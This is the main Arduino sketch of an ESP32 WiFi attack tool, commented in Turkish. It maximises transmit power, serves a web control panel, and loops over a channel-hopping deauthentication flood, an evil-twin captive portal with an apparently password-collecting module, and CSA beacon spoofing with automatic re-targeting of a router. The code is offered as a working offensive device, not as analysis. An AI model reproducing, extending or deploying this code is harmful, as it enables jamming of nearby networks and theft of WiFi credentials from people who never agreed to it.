#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "definitions.h"

int curr_channel = 1;

// Periyodik zamanlamalar
static unsigned long last_csa_send    = 0;
static unsigned long last_retrack     = 0;

// ─── Maks Performans Ayarları ─────────────────────────────────────────────────
static void apply_max_performance() {
  // CPU: ESP32-C3 maks = 160MHz, diğer ESP32 = 240MHz
  setCpuFrequencyMhz(160);

  // WiFi güç tasarrufu KAPALI — minimum gecikme
  esp_wifi_set_ps(WIFI_PS_NONE);

  // TX gücü maksimum (80 = 20 dBm; 0.25 dBm/birim)
  esp_wifi_set_max_tx_power(80);

  // Tüm protokoller etkin (11b/g/n + LR) — maksimum kapsama
  esp_wifi_set_protocol(WIFI_IF_AP,
    WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);

  DEBUG_PRINTLN("Maks performans: 160MHz, TX 20dBm, PS kapali");
}

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  passwords_init();
  apply_max_performance();

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_web_interface();
  DEBUG_PRINTLN("Hazir. 192.168.4.1 adresine baglanin.");
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // Tüm kanallara deauth — web sunucu duruyor, sadece kanal döngüsü
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);

  } else if (evil_twin_active) {
    // Evil Twin modu: DNS + captive portal + retrack + CSA beacon
    evil_twin_loop();
    web_interface_handle_client();

  } else {
    // Normal mod: deauth tek ağ veya bekleme
    web_interface_handle_client();

    unsigned long now = millis();

    // CSA beacon gönder (deauth aktifken, her CSA_INTERVAL_MS'de bir)
    if (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0') {
      if (now - last_csa_send >= CSA_INTERVAL_MS) {
        last_csa_send = now;
        send_csa_beacon();
      }
      // Router resetlenirse hedefi yeniden bul
      if (now - last_retrack >= RETRACK_INTERVAL_MS) {
        last_retrack = now;
        retrack_deauth_target();
      }
    }
  }
}
